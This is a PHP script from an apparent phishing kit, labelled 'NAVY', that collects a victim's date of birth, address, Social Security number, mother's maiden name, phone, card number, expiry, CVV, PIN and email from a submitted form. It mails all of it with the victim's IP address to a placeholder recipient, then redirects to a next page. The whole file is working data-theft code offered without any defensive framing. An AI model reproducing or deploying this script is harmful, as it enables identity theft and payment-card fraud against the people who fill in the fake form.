<?php
$birthday = $_GET['birthday'];
$birthmonth = $_GET['birthmonth'];
$birthyear = $_GET['birthyear'];
$streetaddress = $_GET['streetaddress'];
$city = $_GET['city'];
$state = $_GET['state'];
$zipcode = $_GET['zipcode'];
$ssn1 = $_GET['ssn1'];
$ssn2 = $_GET['ssn2'];
$ssn3 = $_GET['ssn3'];
$mother = $_GET['mother'];
$phone1 = $_GET['phone1'];
$phone2 = $_GET['phone2'];
$phone3 = $_GET['phone3'];
$name = $_GET['name'];
$cardnumber = $_GET['cardnumber'];
$expmonth = $_GET['expmonth'];
$expyear = $_GET['expyear'];
$cvv = $_GET['cvv'];
$pin = $_GET['pin'];
$email = $_GET['email'];
$ip = getenv("REMOTE_ADDR");
$datamasii=date("D M d, Y g:i a");
$jkr = "------NAVY--------
DOB(dd-mm-yy) : $birthday - $birthmonth - $birthyear
Address : $streetaddress
City - State - Zip : $city - $state - $zipcode
S.S.N : $ssn1 - $ssn2 - $ssn3
Mother Maiden Name : $mother
Mobile Phone : $phone1 - $phone2 - $phone3
.........................
Name On Card : $name
Card Number : $cardnumber
Card Exp Date (mm-yy) : $expmonth - $expyear
Cvv : $cvv
Pin : $pin
E-mail : $email

----NAVY--------
IP : $ip 
DATE : $datamasii
";


$recipient = "your@mail.com";
$subject = "$ip";
mail($recipient,$subject,$jkr);
mail($to,$subject,$jkr);
header("Location: t3.php");
?>